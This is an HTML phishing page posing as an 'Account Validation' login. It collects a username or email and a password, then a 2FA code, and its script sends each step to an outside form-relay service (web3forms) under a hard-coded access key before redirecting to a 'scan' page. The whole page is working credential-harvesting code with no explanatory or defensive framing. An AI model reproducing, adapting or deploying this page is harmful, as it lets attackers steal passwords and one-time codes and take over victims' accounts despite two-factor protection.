<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}
form {border: 3px solid #f1f1f1; padding: 16px;}

input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  background-color: #04AA6D;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover { opacity: 0.8; }

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container { padding: 16px; }

#step2 {
  display: none; /* hidden until step1 is submitted */
}
</style>
</head>
<body>

<h2>Account Validation</h2>

<div class="imgcontainer">
  <img src="img_avatar2.png" alt="Avatar" class="avatar">
</div>

<!-- Step 1: Username + Password -->
<form id="step1Form" action="https://api.web3forms.com/submit" method="POST">
  <input type="hidden" name="access_key" value="bd395d4f-052f-46be-bebe-62e62bf140d1">
  <input type="hidden" name="_next" value="#">

  <div class="container">
    <label for="email"><b>Username</b></label>
    <input type="text" placeholder="Email/Mobile number" name="email" required>

    <label for="password"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="password" required>

    <button type="submit">Proceed</button>
  </div>
</form>

<!-- Step 2: Validation Code -->
<form id="step2Form" action="https://api.web3forms.com/submit" method="POST">
  <input type="hidden" name="access_key" value="bd395d4f-052f-46be-bebe-62e62bf140d1">
  <!-- Redirect after final submission -->
  <input type="hidden" name="_next" value="/scan/scan/index.html">

  <div id="step2" class="container">
    <label for="code"><b>Authentication Code</b></label>
    <input type="text" placeholder="Enter 2fa Code" name="code" required>

    <button type="submit">Login</button>
  </div>
</form>

<script>
  const step1Form = document.getElementById("step1Form");
  const step2 = document.getElementById("step2");

  step1Form.addEventListener("submit", function(e) {
    e.preventDefault();

    // Submit step1 via fetch
    const formData = new FormData(step1Form);
    fetch(step1Form.action, {
      method: step1Form.method,
      body: formData
    })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        // Show step2 form after successful step1
        step2.style.display = "block";
        step1Form.style.display = "none";
      } else {
        alert("❌ Username/Password submission failed.");
      }
    })
    .catch(() => alert("❌ Error submitting Step 1."));
  });
</script>

</body>
</html>
